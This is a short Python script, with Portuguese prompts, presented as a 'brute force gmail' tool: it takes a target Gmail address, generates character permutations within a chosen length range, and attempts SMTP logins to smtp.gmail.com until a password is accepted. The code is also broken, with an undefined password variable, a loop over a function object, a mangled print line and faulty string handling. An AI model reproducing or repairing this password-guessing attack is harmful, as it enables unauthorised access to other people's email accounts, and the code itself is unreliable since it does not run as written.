import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print('''
	==========================================
	|            brute force gmail           |
	|----------------------------------------|
	|                                        |
        |              Por Gilmar Filho          |
	|                                        |
        |                                        |
	|----------------------------------------|
	''')

user = input("Entre com o Gmail : ")
min_digitos = (int(input("Entre a quantidade de caracteres minimos: ")))
qnt_digitos = (int(input("Entre com a quantidade de caracteres maximos: ")))
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            print(''.join(perm)) 

print_perms("abcçdefghijklmnopkrstuvwxyzABCÇDEFGHIJKLMNOPQRSTUVWXYZ0123456789/*-+.)(&¨%$#@!"'\,?°]º:;|§_~^", min_digitos, qnt_digitos)

for symbols in print_perms:
    try:
        smtpserver.login(user, password)
	 rint ("[+] Senha encontrada: %s") % symbols
        break;
    except smtplib.SMTPAuthenticationError:
        print ("[!] Senha tem mais do que "  + qnt_digitos + ": %s") % symbols
